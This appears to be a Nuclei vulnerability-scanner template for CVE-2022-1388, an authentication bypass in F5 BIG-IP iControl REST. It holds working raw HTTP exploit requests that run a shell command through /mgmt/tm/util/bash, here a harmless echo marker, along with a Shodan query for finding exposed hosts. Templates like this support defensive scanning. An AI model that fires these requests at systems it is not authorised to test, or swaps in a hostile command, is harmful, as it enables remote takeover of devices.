id: CVE-2022-1388
info:
  name: F5 BIG-IP iControl - REST Auth Bypass RCE
  author: dwisiswant0,Ph33r
  severity: critical
  description: An authentication bypass vulnerability in F5 BIG-IP iControl REST may
    allow undisclosed requests to bypass authentication and execute remote code.
  reference:
  - https://twitter.com/GossiTheDog/status/1523566937414193153
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  - https://support.f5.com/csp/article/K23605346
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1388
    cwe-id: CWE-306
  metadata:
    shodan-query: http.title:"BIG-IP&reg;-+Redirect" +"Server"
    verified: 'true'
    impact: The disclosed CVE-2022-1388 vulnerability in F5 BIG-IP iControl could
      potentially allow unauthorized access and control of vulnerable systems, resulting
      in a significant impact on their security and operations.
    recommendation: Upgrade F5 BIG-IP to versions 16.1.2.2, 15.1.5.1, 14.1.4.6, or
      13.1.5 to prevent an iControl REST authentication bypass vulnerability.
  tags: f5,bigip,cve,cve2022,rce,mirai,kev
variables:
  auth: 'admin:'
  cmd: echo CVE-2022-1388 | rev
requests:
- raw:
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {{Hostname}}\nConnection: keep-alive,\
    \ X-F5-Auth-Token\nX-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\n\
    Content-Type: application/json\n\n{\n     \"command\": \"run\",\n     \"utilCmdArgs\"\
    : \"-c '{{cmd}}'\"\n}\n"
  - "POST /mgmt/tm/util/bash HTTP/1.1\nHost: localhost\nConnection: keep-alive, X-F5-Auth-Token\n\
    X-F5-Auth-Token: a\nAuthorization: Basic {{base64(auth)}}\nContent-Type: application/json\n\
    \n{\n     \"command\": \"run\",\n     \"utilCmdArgs\": \"-c '{{cmd}}'\"\n}\n"
  stop-at-first-match: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - commandResult
    - 8831-2202-EVC
    condition: and
